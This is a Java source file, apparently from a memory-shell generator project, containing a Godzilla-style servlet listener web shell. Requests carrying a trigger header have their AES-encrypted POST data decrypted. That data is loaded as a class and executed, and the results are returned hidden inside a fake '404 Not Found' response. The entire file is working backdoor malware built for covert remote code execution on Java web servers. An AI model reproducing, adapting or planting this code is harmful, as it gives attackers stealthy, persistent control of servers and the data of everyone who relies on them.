package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Godzilla HW Listener 模板（JAVA_AES_BASE64_PROFILE）。
 * <p>
 * 只包含当前加密器的协议，由 {@link GodzillaHwGenerator} 按配置选择；
 * 请求/响应统一通过反射访问，容器钩子只需传入 request/response。
 *
 * @author ReaJason
 */
public class GodzillaHwListenerProfile extends ClassLoader implements ServletRequestListener {
    private static String key;
    private static String pass;
    private static String md5;
    private static String style = "404 Not Found";
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;


    public GodzillaHwListenerProfile() {
    }

    public GodzillaHwListenerProfile(ClassLoader parent) {
        super(parent);
    }

    @Override
    @SuppressWarnings("all")
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                run(request, response);
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private Object getResponseFromRequest(Object request) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    private boolean run(Object request, Object response) throws Exception {
        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
        if (value == null || !value.contains(headerValue)) {
            return false;
        }
        PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
        String method = (String) request.getClass().getMethod("getMethod").invoke(request);
        if (!"POST".equalsIgnoreCase(method)) {
            writer.write(style.replace("##style##", "404 Not Found"));
            writer.flush();
            writer.close();
            return true;
        }
        String sdata = readBodyString(request);
        if (sdata.indexOf(md5.substring(16)) > 0) {
            style = new String(x(base64Decode(java.net.URLDecoder.decode(sdata.split(md5.substring(16))[1], "UTF-8")), false));
        }
        if (sdata.indexOf(md5.substring(0, 16)) > 0) {
            sdata = sdata.split(md5.substring(0, 16))[1];
            byte[] data = x(base64Decode(java.net.URLDecoder.decode(sdata, "UTF-8")), false);
            if (payload == null) {
                payload = this.defineClass(data, 0, data.length);
                writer.write(style.replace("##style##", ""));
            } else {
                byte[] result = execute(request, data);
                String encoded = java.net.URLEncoder.encode(base64Encode(x(result, true)), "UTF-8");
                writer.write(style.replace("##style##", md5.substring(0, 16) + encoded + md5.substring(16)));
            }
        } else {
            writer.write(style.replace("##style##", ""));
        }
        writer.flush();
        writer.close();
        return true;
    }

    @SuppressWarnings("all")
    private static byte[] execute(Object request, byte[] data) throws Exception {
        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
        Object f = payload.newInstance();
        f.equals(arrOut);
        f.equals(request);
        f.equals(data);
        f.toString();
        return arrOut.toByteArray();
    }

    @SuppressWarnings("all")
    private static String readBodyString(Object request) throws Exception {
        java.io.BufferedReader reader = (java.io.BufferedReader) request.getClass().getMethod("getReader").invoke(request);
        StringBuilder builder = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            builder.append(line);
        }
        return builder.toString();
    }
    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }
    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"),
                new javax.crypto.spec.IvParameterSpec(pass.getBytes("UTF-8")));
        return cipher.doFinal(s);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }
}
